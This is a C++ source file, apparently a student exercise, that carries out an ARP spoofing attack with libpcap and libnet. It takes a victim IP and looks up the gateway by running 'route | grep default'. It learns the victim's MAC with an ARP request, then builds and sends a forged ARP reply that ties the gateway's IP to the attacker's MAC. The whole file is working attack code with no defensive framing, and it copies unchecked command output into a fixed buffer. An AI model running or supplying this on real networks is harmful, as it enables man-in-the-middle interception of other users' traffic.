#include <iostream>
#include "pcap.h"
//#include "header.h"
#include <libnet.h>
#include <arpa/inet.h>

using namespace std;
void fprint_hex(FILE *fd, const u_char *addr, int len);

int set_gateway_ip(char *gate_ip) {

    // get gateway ip address
    FILE *fp;
    char result[100];

    /****** obtaining gate ip address ******/
    /* Open the command for reading. */
    fp = popen("route | grep default", "r");
    if (fp == NULL) {
        printf("Failed to run command\n" );
        exit(1);
    }

    char *token;
    /* Read the output a line at a time - output it. */
    if (fgets(result, sizeof(result)-1, fp) != NULL) {
        char *token = strtok(result, " ");
        token = strtok(NULL, " ");
        printf("set_gateway_ip : [%s]\n", token);
        // memcpy(gate_ip, token, strlen(token));
        strcpy(gate_ip,token);
    }
    /* close */
    pclose(fp);


    // if (sizeof(token) < str_size) {
    //     printf("wrong size=%d", sizeof(token));
    //     return -1;
    // }

    return 0;
}

int main(int argc, char *argv[])
{
//    printf("arg=%s, size=%d\n", argv[1], strlen(argv[1]));

//    if (strlen(argv[1]) > INET_ADDRSTRLEN) {
//        printf("wrong argument : too long address");
//        exit(0);
//    }
//    char victim_ip[INET_ADDRSTRLEN];
//    strcpy(victim_ip, argv[1]);

    char victim_ip[INET_ADDRSTRLEN];
    cout << "dest ip?" ;
    cin >> victim_ip;

    struct libnet_ipv4_hdr ip_h;
    //inet_pton(AF_INET, victim_ip, ip_h.ip_dst.s_addr);



    // open pcap device
    pcap_t *adhandle;
    char errbuf[PCAP_ERRBUF_SIZE];

    char *dev;    // 사용중인 네트웍 디바이스 이름
    dev = pcap_lookupdev(errbuf);
    // 에러가 발생했을경우
    if(dev == NULL)
    {
        printf("%s\n",errbuf);
        return -1;
    }
    // 네트웍 디바이스 이름 출력
    printf("DEV: %s\n",dev);

    /* Open the device */
    if ( (adhandle= pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf) ) == NULL)
    {
        fprintf(stderr,"\nUnable to open the adapter. %s is not supported by WinPcap\n", dev);
        return -1;
    }

    ////// 1. obtain my MAC address
    char my_mac[6];
    struct ifreq buffer;
    int s = socket(PF_INET, SOCK_DGRAM, 0);
    memset(&buffer, 0x00, sizeof(buffer));
    strcpy(buffer.ifr_name, dev);
    ioctl(s, SIOCGIFHWADDR, &buffer);
    close(s);
    for( s = 0; s < 6; s++ )
    {
        printf("%.2X ", (unsigned char)buffer.ifr_hwaddr.sa_data[s]);
        my_mac[s] = (unsigned char)buffer.ifr_hwaddr.sa_data[s];
        
    }
    printf("\n");

    ////// 2. obtain my IP address
    struct in_addr my_ip;
    s = socket(AF_INET, SOCK_DGRAM, 0);
    memset(&buffer, 0x00, sizeof(buffer));
    /* I want to get an IPv4 IP address */
    strcpy(buffer.ifr_name, dev);
    buffer.ifr_addr.sa_family = AF_INET;
    ioctl(s, SIOCGIFADDR, &buffer);
    close(s);
    my_ip = ((struct sockaddr_in *)&buffer.ifr_addr)->sin_addr;
    /* display result */
    printf("my ip = [%s]\n", inet_ntoa(my_ip));

    ////// 3.  obtain gateway(receiver)'s ip address
    char gateway_ip[INET_ADDRSTRLEN];
    set_gateway_ip(gateway_ip);
    printf("receiver ip = [%s]\n", gateway_ip);



    // create & send ARP REQUEST to destination(sender) ip
    // then obtain the sender MAC address
    u_char packet[LIBNET_ETH_H + LIBNET_ARP_ETH_IP_H];
    struct libnet_ethernet_hdr *eth_h = (struct libnet_ethernet_hdr *)packet;
    int i;
    for (i = 0; i < 6; i++)
        eth_h->ether_dhost[i] = 0xff;

    for (i = 0; i < 6; i++)
        eth_h->ether_shost[i] = my_mac[i];
    eth_h->ether_type = htons(ETHERTYPE_ARP);

    struct libnet_arp_hdr *arp_hdr = (struct libnet_arp_hdr *)(packet + LIBNET_ETH_H);
    arp_hdr->ar_hrd = htons(ARPHRD_ETHER);
    arp_hdr->ar_pro = htons(0x0800); //IPv4
    arp_hdr->ar_hln = 6;
    arp_hdr->ar_pln = 4;
    arp_hdr->ar_op = htons(ARPOP_REQUEST);

   
    // set source mac address
    for (i = 0; i < 6; i++) 
        packet[LIBNET_ETH_H+LIBNET_ARP_H+i] = my_mac[i];

    // set source ip address
    memcpy((char*)arp_hdr + LIBNET_ARP_H + 6, &my_ip, sizeof(my_ip));

    // set victim mac address
    for (i = 0; i < 6; i++)
        packet[LIBNET_ETH_H+LIBNET_ARP_H + 6 + 4 + i] = 0x00;
    // set victim ip address
    char victim_ip_n[4];
    inet_pton(AF_INET, victim_ip, victim_ip_n);
    memcpy((char*)arp_hdr + LIBNET_ARP_H + 6 + 4 + 6, victim_ip_n, 4);
    

    fprint_hex(stdout, packet, LIBNET_ETH_H + LIBNET_ARP_ETH_IP_H);

    // send arp packet
    pcap_sendpacket(adhandle, packet, LIBNET_ETH_H + LIBNET_ARP_ETH_IP_H);

    struct pcap_pkthdr *pkt_header;
    const u_char *pkt_data;
    while (pcap_next_ex(adhandle, &pkt_header, &pkt_data)) {
        struct libnet_ethernet_hdr* eth_h = (struct libnet_ethernet_hdr*)pkt_data;
        unsigned short ether_type = ntohs(eth_h->ether_type);
        if (ether_type == ETHERTYPE_ARP) {
            fprint_hex(stdout, pkt_data, LIBNET_ETH_H + LIBNET_ARP_ETH_IP_H);
            char source_ip[INET_ADDRSTRLEN];
            inet_ntop(AF_INET, pkt_data + LIBNET_ETH_H + LIBNET_ARP_H + 6, source_ip, INET_ADDRSTRLEN);
            if ( strcmp(victim_ip, source_ip) == 0) {
                printf("find victim's(%s) ARP REPLY!!\n", victim_ip);
                break;
            }
        }
    }
    // set victim's mac
    char victim_mac[6];
    for (i = 0; i < 6; i++)
        victim_mac[i] = *(pkt_data + LIBNET_ETH_H + LIBNET_ARP_H + i);


    // generate and send arp spoofing attack packet
    u_char spoofing_pkt[LIBNET_ETH_H + LIBNET_ARP_ETH_IP_H];
    
    for (i = 0; i < 6; i++)
        spoofing_pkt[i] = victim_mac[i];
    for (i = 0; i < 6; i++)
        spoofing_pkt[6+i] = my_mac[i];
    ((struct libnet_ethernet_hdr *)spoofing_pkt)->ether_type = htons(ETHERTYPE_ARP);

    ((struct libnet_arp_hdr *)(spoofing_pkt+LIBNET_ETH_H))->ar_hrd = htons(ARPHRD_ETHER);
    ((struct libnet_arp_hdr *)(spoofing_pkt+LIBNET_ETH_H))->ar_pro = htons(0x0800); // IPv4
    ((struct libnet_arp_hdr *)(spoofing_pkt+LIBNET_ETH_H))->ar_hln = 6;
    ((struct libnet_arp_hdr *)(spoofing_pkt+LIBNET_ETH_H))->ar_pln = 4;
    ((struct libnet_arp_hdr *)(spoofing_pkt+LIBNET_ETH_H))->ar_op = htons(ARPOP_REPLY);

    //set source mac
    for (i = 0; i < 6; i++)
        spoofing_pkt[LIBNET_ETH_H + LIBNET_ARP_H + i] = my_mac[i];

    //set source ip
    char gateway_ip_n[4];
    inet_pton(AF_INET, gateway_ip, gateway_ip_n);
    memcpy(&spoofing_pkt[LIBNET_ETH_H + LIBNET_ARP_H + 6], gateway_ip_n, 4);

    //set dest mac
    for (i = 0; i < 6; i++)
        spoofing_pkt[LIBNET_ETH_H + LIBNET_ARP_H + 6 + 4 + i] = victim_mac[i];

    //set dest ip
    memcpy(&spoofing_pkt[LIBNET_ETH_H + LIBNET_ARP_H + 6 + 4 + 6], victim_ip_n, 4);
            
    pcap_sendpacket(adhandle, spoofing_pkt, LIBNET_ETH_H + LIBNET_ARP_ETH_IP_H);
    
    fprint_hex(stdout, spoofing_pkt, LIBNET_ETH_H + LIBNET_ARP_ETH_IP_H);


    return 0;
}

void fprint_hex(FILE *fd, const u_char *addr, int len) {
    int i;
    unsigned char buff[17];
    const u_char *pc = addr;

    if (len == 0) {
        fprintf(fd, "  ZERO LENGTH\n");
        return;
    }
    if (len < 0) {
        fprintf(fd, "  NEGATIVE LENGTH: %i\n",len);
        return;
    }

    // Process every byte in the data.
    for (i = 0; i < len; i++) {
        // Multiple of 16 means new line (with line offset).

        if ((i % 16) == 0) {
            // Just don't print ASCII for the zeroth line.
            if (i != 0)
                fprintf (fd, "  %s\n", buff);

            // Output the offset.
            fprintf (fd, "  %04x ", i);
        }

        // Now the hex code for the specific character.
        fprintf (fd, " %02x", pc[i]);

        // And store a printable ASCII character for later.
        if ((pc[i] < 0x20) || (pc[i] > 0x7e))
            buff[i % 16] = '.';
        else
            buff[i % 16] = pc[i];
        buff[(i % 16) + 1] = '\0';
    }

    // Pad out last line if not exactly 16 characters.
    while ((i % 16) != 0) {
        fprintf (fd, "   ");
        i++;
    }

    // And print the final ASCII bit.
    fprintf (fd, "  %s\n", buff);
}
